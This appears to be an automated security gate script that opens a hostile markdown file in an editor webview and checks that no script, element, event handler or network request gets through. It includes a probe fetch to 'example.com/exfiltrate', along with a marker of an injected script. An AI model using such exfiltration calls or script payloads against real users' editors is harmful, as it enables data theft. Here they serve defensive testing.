/**
 * The M8 gate: a markdown file is untrusted input. Nothing in a hostile note may
 * execute, load, or reach the network.
 */
import { launchCode, openFile, webviewFrame } from "./lib/launch.mjs";

let failures = 0;
const violations = [];
const requests = [];
function check(name, ok, detail = "") {
  if (!ok) failures++;
  console.log(`${ok ? "  ok" : "FAIL"}  ${name}${detail ? ` — ${detail}` : ""}`);
}

const session = await launchCode();
const { page } = session;

page.on("console", (m) => {
  const t = m.text();
  if (/Content Security Policy|Refused to|Trusted Type/i.test(t)) violations.push(t);
});
// Anything reaching for the network at all is a finding.
page.on("request", (r) => {
  const url = r.url();
  if (/example\.com|beacon|tracker/i.test(url)) requests.push(url);
});
page.on("dialog", async (d) => {
  requests.push(`DIALOG: ${d.message()}`);
  await d.dismiss();
});

try {
  await openFile(page, "malicious.md");
  const frame = await webviewFrame(page);
  await frame.waitForSelector(".cm-content", { timeout: 20_000 });
  await page.waitForTimeout(3000);

  console.log("\n— nothing executed —");
  const pwned = await frame.evaluate(() => window.__pwned ?? null);
  check("no inline handler or script ran", pwned === null, String(pwned));

  console.log("\n— markup is text, not elements —");
  const dom = await frame.evaluate(() => ({
    scripts: document.querySelectorAll(".cm-content script").length,
    iframes: document.querySelectorAll(".cm-content iframe").length,
    // CodeMirror inserts its own <img class="cm-widgetBuffer"> around widgets:
    // zero-width, no src, aria-hidden. What matters is an image that can load.
    images: [...document.querySelectorAll(".cm-content img")].filter((i) => i.hasAttribute("src")).length,
    widgetBuffers: document.querySelectorAll(".cm-content img.cm-widgetBuffer").length,
    anchors: document.querySelectorAll(".cm-content a[href]").length,
    styles: document.querySelectorAll(".cm-content style").length,
    base: document.querySelectorAll("base").length,
    handlers: document.querySelectorAll(".cm-content [onclick],[onerror],[onload]").length,
  }));
  check("no <script> elements", dom.scripts === 0, String(dom.scripts));
  check("no <iframe> elements", dom.iframes === 0, String(dom.iframes));
  check("no loadable <img> elements", dom.images === 0, `${dom.images} with src, ${dom.widgetBuffers} CodeMirror widget buffers`);
  check("no href anchors", dom.anchors === 0, String(dom.anchors));
  check("no injected <style>", dom.styles === 0, String(dom.styles));
  check("no <base> hijack", dom.base === 0, String(dom.base));
  check("no inline event handlers", dom.handlers === 0, String(dom.handlers));

  const shown = await frame.evaluate(() =>
    [...document.querySelectorAll(".cm-line")].map((l) => l.textContent ?? "").join("\n"),
  );
  check("the markup is displayed as text", shown.includes("<script>window.__pwned"), "");

  console.log("\n— the table widget —");
  const cells = await frame.evaluate(() => {
    const t = document.querySelector(".cm-table-widget table");
    if (!t) return null;
    return {
      rendered: !!t,
      elements: t.querySelectorAll("script, iframe, img, a[href], [onclick], [onerror]").length,
      text: [...t.querySelectorAll("td")].map((d) => d.textContent ?? "").join(" | "),
    };
  });
  check("hostile table renders", cells?.rendered === true);
  check("no elements smuggled through a cell", cells?.elements === 0, String(cells?.elements));
  check("cell markup is text", cells?.text.includes("<script>"), JSON.stringify(cells?.text?.slice(0, 60)));

  console.log("\n— the network —");
  check("nothing was requested", requests.length === 0, requests.slice(0, 3).join(" | "));

  const blocked = await frame.evaluate(async () => {
    try {
      await fetch("https://example.com/exfiltrate");
      return "ALLOWED";
    } catch (e) {
      return `blocked: ${String(e).slice(0, 40)}`;
    }
  });
  check("connect-src blocks fetch from the webview", blocked !== "ALLOWED", blocked);

  console.log("\n— the editor still works —");
  check("the document did not hang", (await frame.$(".cm-content")) !== null);

  console.log("\n— CSP —");
  // Violations here are the policy doing its job on hostile content; report them.
  console.log(`   ${violations.length} CSP violation(s) reported by the browser:`);
  for (const v of violations) console.log(`     - ${v.slice(0, 150)}`);
  check("no Trusted Types violation from our own code", !violations.some((v) => /Trusted Type/i.test(v)), "");
} catch (err) {
  console.error("\nrun threw:", err);
  failures += 1;
} finally {
  await session.close();
}

console.log(failures === 0 ? "\nSECURITY GATE: PASS" : `\nSECURITY GATE: ${failures} failure(s)`);
process.exit(failures === 0 ? 0 : 1);
